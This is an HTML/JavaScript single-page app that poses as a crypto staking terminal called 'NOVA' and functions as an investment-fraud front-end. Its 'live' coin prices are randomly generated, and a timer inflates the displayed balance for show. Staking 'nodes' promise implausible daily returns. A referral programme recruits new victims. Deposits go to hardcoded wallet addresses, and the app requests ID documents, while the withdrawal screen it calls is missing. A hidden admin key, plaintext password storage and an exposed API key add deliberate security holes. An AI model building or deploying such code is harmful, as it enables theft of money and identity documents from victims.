<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Elite Global Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --gold: #D4AF37; --bg: #050505; }
        body { background: var(--bg); color: white; font-family: 'Plus Jakarta Sans', sans-serif; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
        
        /* Glassmorphism UI */
        .app-card { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 24px; position: relative; overflow: hidden; }
        .gold-glow { box-shadow: 0 0 30px rgba(212, 175, 55, 0.1); border: 1px solid rgba(212, 175, 55, 0.2); }
        
        /* Live Ticker Animation */
        .ticker-wrap { background: rgba(212, 175, 55, 0.1); padding: 5px 0; overflow: hidden; white-space: nowrap; border-bottom: 1px solid rgba(212, 175, 55, 0.1); }
        .ticker-item { display: inline-block; padding: 0 20px; font-size: 9px; font-weight: 800; animation: ticker 20s linear infinite; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* Navigation */
        .nav-bar { position: fixed; bottom: 0; left: 0; right: 0; background: rgba(8, 8, 8, 0.98); backdrop-filter: blur(20px); border-top: 1px solid #151515; padding: 12px 5px; z-index: 1000; display: flex; justify-content: space-around; }
        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: #3d3d3d; font-size: 9px; font-weight: 700; transition: 0.3s; }
        .nav-item.active { color: var(--gold); }

        /* Screens & Modals */
        .screen { display: none; opacity: 0; transform: translateY(10px); transition: 0.4s; }
        .active-screen { display: block; opacity: 1; transform: translateY(0); }
        .modal { display: none; position: fixed; inset: 0; background: #000; z-index: 2000; padding: 25px; padding-top: 60px; overflow-y: auto; }
        
        .nova-input { background: #0c0c0c; border: 1px solid #1a1a1a; width: 100%; padding: 16px; border-radius: 18px; outline: none; color: white; font-size: 13px; }
        .btn-gold { background: var(--gold); color: black; font-weight: 900; letter-spacing: 1px; border-radius: 18px; transition: 0.3s; }
        .btn-gold:active { transform: scale(0.96); }

        .node-img { height: 120px; width: 100%; object-fit: cover; opacity: 0.4; transition: 0.5s; }
        .app-card:hover .node-img { opacity: 0.6; transform: scale(1.05); }
    </style>
</head>
<body>

    <div class="ticker-wrap" id="live-ticker">
        <div class="ticker-item text-green-400">BTC/USDT: <span id="btc-price">$64,231.50</span></div>
        <div class="ticker-item text-blue-400">ETH/USDT: <span id="eth-price">$3,421.12</span></div>
        <div class="ticker-item text-yellow-500">BNB/USDT: <span id="bnb-price">$582.40</span></div>
        <div class="ticker-item text-red-400">SOL/USDT: <span id="sol-price">$145.22</span></div>
    </div>

    <div id="auth-screen" class="min-h-screen flex flex-col items-center justify-center p-8 active-screen">
        <div class="mb-10 text-center">
            <h1 onclick="handleTaps()" class="text-6xl font-black tracking-tighter">NOVA<span class="text-[#D4AF37]">.</span></h1>
            <p class="text-[8px] tracking-[4px] text-gray-600 font-bold uppercase mt-2">Decentralized Finance Engine</p>
        </div>
        <div class="app-card p-8 w-full max-w-sm">
            <input type="text" id="u-email" placeholder="Terminal ID" class="nova-input mb-4">
            <input type="password" id="u-pass" placeholder="Master Passkey" class="nova-input mb-6">
            <input type="text" id="adm-key" placeholder="System Override Key" class="hidden nova-input border-[#D4AF37] mb-4">
            <button onclick="auth()" class="w-full btn-gold py-5 text-xs uppercase">Initialize Protocol</button>
            <div class="mt-8 flex justify-between items-center">
                <span onclick="toggleM()" id="m-text" class="text-[9px] text-gray-500 font-bold uppercase cursor-pointer">New Account</span>
                <span class="text-[9px] text-[#D4AF37] font-bold uppercase cursor-pointer">Forgot Key?</span>
            </div>
        </div>
    </div>

    <div id="app" class="hidden">
        <header class="p-6 flex justify-between items-center bg-black/50 backdrop-blur-md sticky top-0 z-[100]">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 app-card flex items-center justify-center border-[#D4AF37]/30 text-[#D4AF37] font-black">N</div>
                <div>
                    <div class="flex items-center gap-1">
                        <p id="user-id-txt" class="text-[11px] font-black text-white"></p>
                        <i class="fa-solid fa-circle-check text-blue-500 text-[10px]" title="KYC Verified"></i>
                    </div>
                    <p id="user-vip" class="text-[8px] text-[#D4AF37] font-black uppercase tracking-widest">VIP 1 Member</p>
                </div>
            </div>
            <div class="flex items-center gap-4">
                <i onclick="openModal('kyc-modal')" class="fa-solid fa-shield-halved text-gray-600"></i>
                <i onclick="logout()" class="fa-solid fa-power-off text-gray-800"></i>
            </div>
        </header>

        <div id="dash-screen" class="screen active-screen p-6 pb-32">
            <div class="app-card p-10 mb-10 gold-glow text-center bg-gradient-to-br from-[#0c0c0c] to-black">
                <div class="flex justify-center mb-4"><span class="bg-white/5 border border-white/10 px-3 py-1 rounded-full text-[8px] font-bold text-gray-400">AVAILABLE BALANCE</span></div>
                <h1 id="main-bal" class="text-5xl font-black tracking-tighter mb-4">$0.00</h1>
                <div class="flex justify-center gap-6">
                    <div><p class="text-[8px] text-gray-600 font-bold">DAILY YIELD</p><p id="v-daily" class="text-green-500 text-[10px] font-black">+$0.00</p></div>
                    <div class="w-[1px] h-6 bg-white/10"></div>
                    <div><p class="text-[8px] text-gray-600 font-bold">NODE STATUS</p><p class="text-blue-500 text-[10px] font-black">ENCRYPTED</p></div>
                </div>
            </div>

            <div class="grid grid-cols-4 gap-2 mb-12">
                <div onclick="openModal('dep-modal')" class="flex flex-col items-center gap-3">
                    <div class="w-14 h-14 app-card flex items-center justify-center text-green-500 bg-green-500/5 border-green-500/20"><i class="fa-solid fa-arrow-down-to-bracket"></i></div>
                    <span class="text-[9px] font-bold text-gray-500">DEPOSIT</span>
                </div>
                <div onclick="openModal('wd-modal')" class="flex flex-col items-center gap-3">
                    <div class="w-14 h-14 app-card flex items-center justify-center text-red-500 bg-red-500/5 border-red-500/20"><i class="fa-solid fa-paper-plane"></i></div>
                    <span class="text-[9px] font-bold text-gray-500">SEND</span>
                </div>
                <div onclick="openModal('hist-modal')" class="flex flex-col items-center gap-3">
                    <div class="w-14 h-14 app-card flex items-center justify-center text-[#D4AF37] bg-[#D4AF37]/5 border-[#D4AF37]/20"><i class="fa-solid fa-list-ul"></i></div>
                    <span class="text-[9px] font-bold text-gray-500">HISTORY</span>
                </div>
                <div onclick="openModal('kyc-modal')" class="flex flex-col items-center gap-3">
                    <div class="w-14 h-14 app-card flex items-center justify-center text-blue-500 bg-blue-500/5 border-blue-500/20"><i class="fa-solid fa-user-shield"></i></div>
                    <span class="text-[9px] font-bold text-gray-500">VERIFY</span>
                </div>
            </div>

            <div class="flex justify-between items-center mb-5">
                <h3 class="text-[10px] font-black text-gray-500 tracking-[2px] uppercase">Transaction Flow</h3>
                <span onclick="openModal('hist-modal')" class="text-[8px] font-bold text-[#D4AF37]">VIEW ALL</span>
            </div>
            <div id="hist-list-mini" class="space-y-3"></div>
        </div>

        <div id="mine-screen" class="screen p-6 pb-32">
            <h2 class="text-2xl font-black mb-1 gold-text">QUANTUM NODES</h2>
            <p class="text-[9px] text-gray-600 mb-8 uppercase tracking-[3px]">Institutional Grade Staking</p>
            
            <div class="space-y-6">
                <div class="app-card group">
                    <img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=400" class="node-img">
                    <div class="p-6 flex justify-between items-center">
                        <div>
                            <span class="bg-blue-500/20 text-blue-400 text-[7px] px-2 py-0.5 rounded font-black uppercase">Alpha Node</span>
                            <p class="text-2xl font-black mt-1">$15.00</p>
                            <p class="text-[9px] text-green-500 font-bold mt-1">Daily: +$0.85</p>
                        </div>
                        <button onclick="buyNode(15, 0.85, 'VIP 1')" class="bg-white text-black px-6 py-3 rounded-xl text-[10px] font-black uppercase">Activate</button>
                    </div>
                </div>

                <div class="app-card group border-l-2 border-[#D4AF37]">
                    <img src="https://images.unsplash.com/photo-1644088379091-d574269d422f?q=80&w=400" class="node-img">
                    <div class="p-6 flex justify-between items-center">
                        <div>
                            <span class="bg-yellow-500/20 text-yellow-500 text-[7px] px-2 py-0.5 rounded font-black uppercase">Vortex RIG</span>
                            <p class="text-2xl font-black mt-1">$100.00</p>
                            <p class="text-[9px] text-green-500 font-bold mt-1">Daily: +$6.50</p>
                        </div>
                        <button onclick="buyNode(100, 6.50, 'VIP 2')" class="bg-white text-black px-6 py-3 rounded-xl text-[10px] font-black uppercase">Activate</button>
                    </div>
                </div>

                <div class="app-card group gold-glow">
                    <img src="https://images.unsplash.com/photo-1624365169192-6bc825313bc5?q=80&w=400" class="node-img opacity-60">
                    <div class="p-6 flex justify-between items-center">
                        <div>
                            <span class="bg-green-500/20 text-green-400 text-[7px] px-2 py-0.5 rounded font-black uppercase">Master Sovereign</span>
                            <p class="text-2xl font-black mt-1">$20,000</p>
                            <p class="text-[9px] text-green-500 font-bold mt-1">Daily: +$1,600</p>
                        </div>
                        <button onclick="buyNode(20000, 1600, 'VIP 5')" class="btn-gold px-6 py-3 rounded-xl text-[10px] font-black uppercase">Deploy</button>
                    </div>
                </div>
            </div>
        </div>

        <div id="office-screen" class="screen p-6 pb-32">
            <h2 class="text-2xl font-black mb-1 text-white uppercase">Network Office</h2>
            <p class="text-[9px] text-gray-600 mb-8 uppercase tracking-[3px]">Partner Statistics</p>
            
            <div class="grid grid-cols-2 gap-4 mb-8">
                <div class="app-card p-6 border-b-2 border-blue-500">
                    <p class="text-[8px] text-gray-500 font-bold mb-1">TOTAL REEFERALS</p>
                    <h3 class="text-2xl font-black" id="stat-refs">0</h3>
                </div>
                <div class="app-card p-6 border-b-2 border-green-500">
                    <p class="text-[8px] text-gray-500 font-bold mb-1">COMMISSION</p>
                    <h3 class="text-2xl font-black text-green-500" id="stat-earn">$0.00</h3>
                </div>
            </div>

            <div class="app-card p-8 mb-6 text-center">
                <i class="fa-solid fa-link text-[#D4AF37] mb-4 text-2xl"></i>
                <p class="text-[10px] font-bold text-gray-500 uppercase mb-4">Unique Referral Protocol</p>
                <div class="bg-black/50 p-4 rounded-xl border border-white/5 font-mono text-[9px] text-gray-300 break-all select-all" id="ref-link"></div>
            </div>
        </div>

        <div id="dep-modal" class="modal">
            <div onclick="closeModal('dep-modal')" class="mb-10 text-gray-500 font-bold text-xs"><i class="fa-solid fa-arrow-left mr-2"></i> RETURN</div>
            <h2 class="text-3xl font-black mb-8 gold-text">INJECT ASSETS</h2>
            <div class="space-y-4 mb-10">
                <div class="app-card p-5 flex justify-between items-center bg-white/5">
                    <div class="flex items-center gap-3"><i class="fa-brands fa-bitcoin text-yellow-500 text-xl"></i><span class="text-xs font-bold uppercase">Binance (BEP20)</span></div>
                    <button onclick="copyAddr('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37',this)" class="text-[#D4AF37] font-black text-[10px]">COPY</button>
                </div>
                <div class="app-card p-5 flex justify-between items-center bg-white/5">
                    <div class="flex items-center gap-3"><i class="fa-brands fa-ethereum text-blue-400 text-xl"></i><span class="text-xs font-bold uppercase">Meta (ERC20)</span></div>
                    <button onclick="copyAddr('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2',this)" class="text-[#D4AF37] font-black text-[10px]">COPY</button>
                </div>
            </div>
            <div class="space-y-4">
                <input type="number" id="dep-amt" placeholder="Amount (USDT)" class="nova-input">
                <input type="text" id="dep-tid" placeholder="Transaction Hash (TXID)" class="nova-input">
                <input type="file" id="proof-img" class="hidden" onchange="processImg(this)">
                <button onclick="document.getElementById('proof-img').click()" class="w-full py-5 border border-dashed border-gray-800 rounded-2xl text-[10px] text-gray-500 font-black uppercase">Upload Digital Receipt</button>
                <button onclick="requestFin('Deposit')" class="w-full btn-gold py-5 text-xs">CONFIRM TRANSMISSION</button>
            </div>
        </div>

        <div id="kyc-modal" class="modal">
            <div onclick="closeModal('kyc-modal')" class="mb-10 text-gray-500 font-bold text-xs"><i class="fa-solid fa-arrow-left mr-2"></i> RETURN</div>
            <h2 class="text-3xl font-black mb-4 blue-text uppercase">KYC Verification</h2>
            <p class="text-xs text-gray-500 mb-10">Verify your identity to unlock higher limits and faster withdrawals.</p>
            <div class="app-card p-8 text-center border-blue-500/20 mb-8">
                <i class="fa-solid fa-id-card text-4xl text-gray-800 mb-6"></i>
                <p class="text-[10px] text-gray-400 font-bold uppercase mb-8">Identification Documents (CNIC/Passport)</p>
                <button class="w-full py-5 bg-white/5 border border-white/10 rounded-2xl text-[10px] font-black uppercase">Start Document Scan</button>
            </div>
            <p class="text-[8px] text-center text-gray-600 uppercase font-bold italic">Verification is processed within 24 standard hours.</p>
        </div>

        <nav class="nav-bar">
            <div onclick="nav('dash-screen')" class="nav-item active" id="nav-dash"><i class="fa-solid fa-house-user text-xl"></i><span>TERMINAL</span></div>
            <div onclick="nav('mine-screen')" class="nav-item" id="nav-mine"><i class="fa-solid fa-microchip text-xl"></i><span>MINING</span></div>
            <div onclick="nav('office-screen')" class="nav-item" id="nav-office"><i class="fa-solid fa-globe text-xl"></i><span>NETWORK</span></div>
        </nav>
    </div>

    <div id="admin-panel" class="hidden fixed inset-0 bg-black z-[9999] p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-8 border-b border-gray-900 pb-4"><h2 class="text-[#D4AF37] font-black uppercase text-sm tracking-widest">Master Protocol Control</h2><button onclick="location.reload()" class="text-red-500 font-black text-xs">EXIT</button></div>
        <div id="adm-list" class="space-y-4"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot, query, where } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig); const db = getFirestore(app);
        let activeUser = null; let base64Img = ""; window.taps = 0; window.isLogin = true;

        // SESSION PERSISTENCE
        window.onload = () => {
            const saved = localStorage.getItem('nova_session');
            if(saved) start(saved);
            updatePrices(); setInterval(updatePrices, 5000);
        };

        window.handleTaps = () => { taps++; if(taps >= 6) document.getElementById('adm-key').classList.remove('hidden'); };
        window.toggleM = () => { isLogin = !isLogin; document.getElementById('m-text').innerText = isLogin ? "New Account" : "Back to Terminal"; };

        window.auth = async () => {
            const id = document.getElementById('u-email').value.toLowerCase().trim();
            const pw = document.getElementById('u-pass').value;
            if(document.getElementById('adm-key').value === "nov786") { document.getElementById('admin-panel').classList.remove('hidden'); loadAdmin(); return; }
            if(!id || !pw) return alert("System Credentials Required");
            
            const uRef = doc(db, "users", id); const snap = await getDoc(uRef);
            if(!isLogin) {
                if(snap.exists()) return alert("Identity ID occupied");
                await setDoc(uRef, { balance: 0, password: pw, daily: 0, vip: 'VIP 1', time: Date.now() }); 
                localStorage.setItem('nova_session', id); start(id);
            } else {
                if(snap.exists() && snap.data().password === pw) { localStorage.setItem('nova_session', id); start(id); }
                else alert("Authorization Denied");
            }
        };

        function start(id) {
            activeUser = id; document.getElementById('auth-screen').classList.remove('active-screen');
            setTimeout(() => { document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('app').classList.remove('hidden'); }, 400);
            document.getElementById('user-id-txt').innerText = id.toUpperCase();
            document.getElementById('ref-link').innerText = window.location.origin + window.location.pathname + "?ref=" + id;
            
            onSnapshot(doc(db, "users", id), d => {
                const data = d.data();
                document.getElementById('main-bal').innerText = "$" + (data.balance || 0).toFixed(2);
                document.getElementById('v-daily').innerText = "+$" + (data.daily || 0).toFixed(2);
                document.getElementById('user-vip').innerText = data.vip || 'VIP 1 Member';
            });
            loadHistory();
            // MICRO-MINING ANIMATION (Visual Only)
            setInterval(() => { let el = document.getElementById('main-bal'); let val = parseFloat(el.innerText.replace('$','')); el.innerText = "$" + (val + 0.0001).toFixed(4); }, 2500);
        }

        async function updatePrices() {
            const coins = ['btc','eth','bnb','sol'];
            coins.forEach(c => {
                const price = (Math.random() * 1000 + (c === 'btc' ? 64000 : c === 'eth' ? 3400 : 150)).toFixed(2);
                const el = document.getElementById(c + '-price');
                if(el) el.innerText = "$" + price;
            });
        }

        window.buyNode = async (p, d, v) => {
            const r = doc(db, "users", activeUser); const s = await getDoc(r);
            if(s.data().balance < p) return alert("Liquidity Error: Insufficient Funds");
            await updateDoc(r, { balance: s.data().balance - p, daily: (s.data().daily || 0) + d, vip: v });
            alert("Protocol Deployed Successfully! VIP Level Upgraded.");
        };

        window.requestFin = async (type) => {
            const amtId = type === 'Deposit' ? 'dep-amt' : 'wd-amt';
            const amt = parseFloat(document.getElementById(amtId).value);
            const uRef = doc(db, "users", activeUser); const snap = await getDoc(uRef);
            if(type === 'Withdrawal') {
                if(!amt || snap.data().balance < amt) return alert("Liquidity Denial");
                await addDoc(collection(db, "logs"), { user: activeUser, amount: amt, type, status: 'Pending', time: Date.now() });
                await updateDoc(uRef, { balance: snap.data().balance - amt });
                closeModal('wd-modal');
            } else {
                const tid = document.getElementById('dep-tid').value;
                if(!amt || !tid) return alert("Verification Hash Missing");
                await addDoc(collection(db, "logs"), { user: activeUser, amount: amt, type, tid, status: 'Pending', proof: base64Img, time: Date.now() });
                closeModal('dep-modal');
            }
            alert("Data Transmitted to Ledger"); base64Img = "";
        };

        function loadHistory() {
            onSnapshot(query(collection(db, "logs"), where("user", "==", activeUser)), s => {
                const hFull = document.getElementById('hist-list-full'); const hMini = document.getElementById('hist-list-mini');
                if(hFull) hFull.innerHTML = ""; if(hMini) hMini.innerHTML = "";
                let arr = []; s.forEach(d => arr.push(d.data()));
                arr.sort((a,b) => b.time - a.time).forEach((t, i) => {
                    const card = `<div class="app-card p-5 flex justify-between items-center text-[10px] border-b border-white/5">
                        <div class="flex items-center gap-3"><div class="w-8 h-8 rounded-full bg-white/5 flex items-center justify-center"><i class="fa-solid ${t.type=='Deposit'?'fa-arrow-down text-green-500':'fa-arrow-up text-red-500'} text-[10px]"></i></div>
                        <div><p class="font-black uppercase">${t.type}</p><p class="text-gray-600 text-[8px]">${new Date(t.time).toLocaleDateString()}</p></div></div>
                        <div class="text-right"><p class="font-black text-white">$${t.amount.toFixed(2)}</p><p class="${t.status=='Pending'?'text-yellow-600':'text-blue-500'} font-bold uppercase text-[8px]">${t.status}</p></div>
                    </div>`;
                    if(hFull) hFull.innerHTML += card; if(i < 3 && hMini) hMini.innerHTML += card;
                });
            });
        }

        window.processImg = (el) => { const reader = new FileReader(); reader.onload = () => base64Img = reader.result; reader.readAsDataURL(el.files[0]); };
        window.openModal = (id) => { document.getElementById(id).style.display = 'block'; document.body.style.overflow = 'hidden'; };
        window.closeModal = (id) => { document.getElementById(id).style.display = 'none'; document.body.style.overflow = 'auto'; };
        window.copyAddr = (a, b) => { navigator.clipboard.writeText(a); b.innerText = "COPIED"; setTimeout(() => b.innerText = "COPY", 2000); };
        window.nav = (id) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            setTimeout(() => {
                document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
                const target = document.getElementById(id); target.style.display = 'block';
                setTimeout(() => target.classList.add('active-screen'), 50);
                const map = {'dash-screen':'nav-dash','mine-screen':'nav-mine','office-screen':'nav-office'};
                document.getElementById(map[id]).classList.add('active');
            }, 200);
        };
        window.logout = () => { localStorage.removeItem('nova_session'); location.reload(); };
    </script>
</body>
</html>
